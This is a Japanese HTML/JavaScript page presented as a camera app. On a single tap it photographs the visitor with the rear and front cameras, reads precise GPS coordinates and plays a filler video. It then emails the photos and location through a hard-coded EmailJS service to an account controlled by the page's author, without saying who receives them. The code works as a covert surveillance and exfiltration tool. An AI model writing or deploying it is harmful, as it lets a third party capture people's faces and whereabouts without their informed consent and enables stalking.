<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>内カメ・外カメ撮影アプリ（EmailJS連携）</title>

<style>
    body {
        margin: 0; padding: 20px;
        font-family: Arial, sans-serif;
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        color: white;
        min-height: 100vh;
        cursor: pointer;
    }
    .container {
        max-width: 800px; margin: 0 auto; text-align: center;
    }
    .touch-area {
        background: rgba(255,255,255,0.1);
        border: 2px dashed rgba(255,255,255,0.3);
        border-radius: 15px;
        padding: 40px;
        margin: 20px 0;
        cursor: pointer;
        transition: all 0.3s ease;
        min-height: 200px;
    }
    .touch-area:hover {
        background: rgba(255,255,255,0.2);
        border-color: rgba(255,255,255,0.5);
    }
    .media-container {
        margin: 20px 0;
        background: rgba(0,0,0,0.2);
        border-radius: 10px;
        padding: 20px;
    }
    video,img {
        max-width: 100%;
        height: auto;
        border-radius: 8px;
        margin: 10px 0;
    }
    .status {
        background: rgba(0,0,0,0.3);
        padding: 15px;
        border-radius: 5px;
        margin: 10px 0;
        font-size: 16px;
    }
    .data-display {
        background: rgba(0,0,0,0.2);
        padding: 15px;
        border-radius: 8px;
        margin: 10px 0;
        text-align: left;
        font-family: monospace;
        font-size: 12px;
        word-break: break-all;
    }
    .error { color: #ff6b6b; background: rgba(255,107,107,0.1); }
    .success { color: #4CAF50; background: rgba(76,175,80,0.1); }
    .warning { color: #ff9800; background: rgba(255,152,0,0.1); }
    .debug-toggle {
        position: fixed; top: 10px; right: 10px;
        background: rgba(0,0,0,0.5);
        color: white;
        border: none;
        padding: 10px;
        border-radius: 5px;
        cursor: pointer;
        font-size: 12px;
    }
    .debug-info {
        background: rgba(0,0,0,0.7);
        padding: 10px;
        border-radius: 5px;
        margin: 10px 0;
        font-family: monospace;
        font-size: 11px;
        text-align: left;
        max-height: 200px;
        overflow-y: auto;
        display: none;
    }
</style>

<!-- EmailJS SDK 最新版に変更（2025年7月時点） -->
<script src="https://cdn.emailjs.com/sdk/latest/email.min.js"></script>
<script defer>
  window.addEventListener('DOMContentLoaded', () => {
    if(window.emailjs){
      emailjs.init("cPjKBUm_i6HebDQF7");
      console.log("EmailJS initialized");
    } else {
      console.error("EmailJS SDKが読み込まれていません");
    }
  });
</script>

</head>
<body>
<button class="debug-toggle" onclick="toggleDebug()">Debug</button>

<div class="container">
    <h1>📱 内カメ・外カメ撮影アプリ</h1>
    <p>クリック/タッチで内カメと外カメの写真を撮り、位置情報と動画再生後にメール送信します</p>
    
    <div class="touch-area" id="touchArea" tabindex="0" role="button" aria-pressed="false" aria-label="撮影開始ボタン">
        <h2>📱 ここをクリック/タッチで実行</h2>
        <p>PC: クリック | スマホ: タッチ</p>
        <div style="font-size: 12px; margin-top: 10px; opacity: 0.8;">
            外カメ写真 → 内カメ写真 → 位置情報取得 → 動画再生 → メール送信
        </div>
    </div>
    
    <div class="status" id="status">待機中...</div>
    
    <div class="debug-info" id="debugInfo"></div>
    
    <div class="media-container">
        <video id="cameraVideo" autoplay muted playsinline style="display:none;"></video>
        <canvas id="photoCanvas" style="display:none;"></canvas>
        <img id="capturedPhotoRear" style="display:none;" alt="外カメ写真">
        <img id="capturedPhotoFront" style="display:none;" alt="内カメ写真">
        <video id="playbackVideo" style="display:none;" controls playsinline></video>
    </div>
    
    <div class="data-display" id="locationData" style="display:none;"></div>
    <div class="data-display" id="photoDataRear" style="display:none;"></div>
    <div class="data-display" id="photoDataFront" style="display:none;"></div>
    <div class="data-display" id="videoData" style="display:none;"></div>
</div>

<script>
    const status = document.getElementById('status');
    const debugInfo = document.getElementById('debugInfo');
    const touchArea = document.getElementById('touchArea');
    const cameraVideo = document.getElementById('cameraVideo');
    const photoCanvas = document.getElementById('photoCanvas');
    const capturedPhotoRear = document.getElementById('capturedPhotoRear');
    const capturedPhotoFront = document.getElementById('capturedPhotoFront');
    const playbackVideo = document.getElementById('playbackVideo');
    const locationData = document.getElementById('locationData');
    const photoDataRear = document.getElementById('photoDataRear');
    const photoDataFront = document.getElementById('photoDataFront');
    const videoData = document.getElementById('videoData');

    let isProcessing = false;
    let lastTouchTime = 0;
    let debugMode = false;
    let mediaStream = null;

    const sampleVideoBase64 = "data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAACKBtZGF0AAAC7G1vb3YAA..."; // 省略

    function logDebug(msg) {
        const t = new Date().toLocaleTimeString();
        const line = `[${t}] ${msg}`;
        console.log(line);
        if(debugMode){
            debugInfo.innerHTML += line + "<br>";
            debugInfo.scrollTop = debugInfo.scrollHeight;
        }
    }
    function toggleDebug(){
        debugMode = !debugMode;
        debugInfo.style.display = debugMode ? 'block' : 'none';
        if(debugMode) debugInfo.innerHTML = "<strong>デバッグモード開始</strong><br>";
    }
    function updateStatus(msg,type='info'){
        status.textContent = msg;
        status.className = `status ${type}`;
        logDebug(`Status [${type}]: ${msg}`);
    }

    async function capturePhotoByCamera(facingMode){
        updateStatus(`📸 ${facingMode}カメラ起動中...`, 'warning');
        try {
            if(mediaStream) {
                mediaStream.getTracks().forEach(t => t.stop());
                mediaStream = null;
            }
            mediaStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: { exact: facingMode } },  // exact指定でより確実に切り替え
                audio: false
            });
            cameraVideo.srcObject = mediaStream;
            cameraVideo.style.display = 'block';

            // videoWidthが設定されるまで待つ。最大3秒まで待機。
            await new Promise((resolve, reject) => {
                let waited = 0;
                const interval = setInterval(() => {
                    if(cameraVideo.videoWidth > 0){
                        clearInterval(interval);
                        resolve();
                    } else {
                        waited += 200;
                        if(waited > 3000){
                            clearInterval(interval);
                            resolve();  // videoWidthが取れなくても続行
                        }
                    }
                }, 200);
            });

            const ctx = photoCanvas.getContext('2d');
            photoCanvas.width = cameraVideo.videoWidth || 640;
            photoCanvas.height = cameraVideo.videoHeight || 480;

            ctx.drawImage(cameraVideo, 0, 0, photoCanvas.width, photoCanvas.height);

            const base64 = photoCanvas.toDataURL('image/jpeg', 0.8);

            mediaStream.getTracks().forEach(t => t.stop());
            cameraVideo.style.display = 'none';
            mediaStream = null;

            updateStatus(`📸 ${facingMode}カメラ撮影完了`, 'success');
            return base64;

        } catch(e){
            updateStatus(`📸 ${facingMode}カメラエラー`, 'error');
            throw new Error(`${facingMode}カメラアクセスエラー: ${e.message}`);
        }
    }

    async function getLocation(){
        updateStatus("📍 位置情報取得中...", 'warning');

        return new Promise((resolve,reject) => {
            if(!navigator.geolocation){
                reject(new Error("位置情報非対応"));
                return;
            }
            navigator.geolocation.getCurrentPosition(
                pos => {
                    const loc = {
                        latitude: pos.coords.latitude,
                        longitude: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        timestamp: new Date().toISOString()
                    };
                    locationData.innerHTML = `<strong>位置情報:</strong><br>
                        緯度: ${loc.latitude}<br>
                        経度: ${loc.longitude}<br>
                        精度: ${loc.accuracy}m<br>
                        時刻: ${loc.timestamp}`;
                    locationData.style.display = 'block';
                    updateStatus("📍 位置情報取得完了", 'success');
                    resolve(loc);
                },
                err => {
                    updateStatus("📍 位置情報エラー", 'error');
                    reject(new Error(`位置情報エラー: ${err.message}`));
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        });
    }

    async function playSampleVideo(){
        updateStatus("🎬 動画再生中...", 'warning');
        playbackVideo.src = sampleVideoBase64;
        playbackVideo.style.display = 'block';

        videoData.innerHTML = `<strong>動画データ:</strong><br>サイズ: ${Math.round(sampleVideoBase64.length/1024)} KB<br>データ: ${sampleVideoBase64.substring(0,100)}...`;
        videoData.style.display = 'block';

        try {
            await playbackVideo.play();
            updateStatus("🎬 動画再生開始", 'success');
        } catch(err) {
            updateStatus("🎬 動画自動再生拒否。ユーザー操作を促す", 'warning');
            logDebug(`動画再生エラー: ${err.message}`);
            // 必要ならユーザーに再生ボタンを表示し、クリックで再生促す実装にするのが望ましい
            throw err;
        }
    }

    async function sendEmail({photoRear, photoFront, location, videoPlayed}){
        updateStatus("✉️ メール送信中...", 'warning');
        if(typeof emailjs === "undefined"){
            updateStatus("✉️ EmailJS SDK未読み込み", "error");
            logDebug("EmailJS未定義エラー");
            throw new Error("EmailJS SDK未読み込み");
        }
        try {
            const templateParams = {
                photo_rear: photoRear,
                photo_front: photoFront,
                // location_infoはHTMLタグ含むがテンプレート側でHTML扱いになるか確認推奨
                location_info: `緯度: ${location.latitude}<br>経度: ${location.longitude}<br>精度: ${location.accuracy}m<br>時刻: ${location.timestamp}`,
                video_status: videoPlayed ? "動画再生完了" : "動画再生無し",
                date: new Date().toLocaleString()
            };
            await emailjs.send('service_ja2c09x', 'template_2fp2jrg', templateParams);
            updateStatus("✉️ メール送信完了", 'success');
            logDebug("EmailJS送信成功");
        } catch(e) {
            updateStatus("✉️ メール送信失敗", 'error');
            logDebug(`EmailJS送信エラー: ${e.message}`);
            throw new Error("メール送信に失敗しました");
        }
    }

    async function executeFullProcess(){
        logDebug("処理開始");
        try {
            const photoRear = await capturePhotoByCamera("environment");
            capturedPhotoRear.src = photoRear;
            capturedPhotoRear.style.display = "block";
            photoDataRear.innerHTML = `<strong>外カメ写真サイズ:</strong> ${Math.round(photoRear.length/1024)} KB`;
            photoDataRear.style.display = "block";

            const photoFront = await capturePhotoByCamera("user");
            capturedPhotoFront.src = photoFront;
            capturedPhotoFront.style.display = "block";
            photoDataFront.innerHTML = `<strong>内カメ写真サイズ:</strong> ${Math.round(photoFront.length/1024)} KB`;
            photoDataFront.style.display = "block";

            // 位置情報取得：失敗しても続行
            let location = {
                latitude: "取得失敗",
                longitude: "取得失敗",
                accuracy: "不明",
                timestamp: new Date().toISOString()
            };
            try {
                location = await getLocation();
            } catch(e){
                logDebug("位置情報取得失敗：" + e.message);
                updateStatus("📍 位置情報なしで続行", "warning");
            }

            let videoPlayed = false;
            try {
                await playSampleVideo();
                videoPlayed = true;
            } catch(e) {
                logDebug(`動画再生失敗: ${e.message}`);
                updateStatus("🎬 動画再生に失敗しましたが処理を続行します", "warning");
            }

            await sendEmail({photoRear, photoFront, location, videoPlayed});

            document.body.style.background = 'linear-gradient(135deg, #4CAF50 0%, #45a049 100%)';
            updateStatus("✅ 全処理完了！", "success");

        } catch(e) {
            logDebug(`エラー発生: ${e.message}`);
            document.body.style.background = 'linear-gradient(135deg, #f44336 0%, #d32f2f 100%)';
            updateStatus(`❌ エラー: ${e.message}`, "error");
        } finally {
            isProcessing = false;
            setTimeout(() => {
                document.body.style.background = 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)';
                updateStatus("待機中...", "info");
            }, 5000);
        }
    }

    function handleTouch(e){
        e.preventDefault();
        const now = Date.now();
        if(now - lastTouchTime < 5000){  // クールダウンを5秒に延長
            logDebug("クールダウン中");
            return;
        }
        if(isProcessing){
            logDebug("処理中のため無視");
            return;
        }
        lastTouchTime = now;
        isProcessing = true;
        document.body.style.background = 'linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%)';
        updateStatus("🔄 処理開始...", "warning");
        executeFullProcess();
    }

    touchArea.addEventListener('click', handleTouch);
    touchArea.addEventListener('touchstart', handleTouch, {passive:false});

    updateStatus("📱 準備完了！クリック/タッチで開始", "success");
    logDebug("アプリ初期化完了");
</script>

</body>
</html>
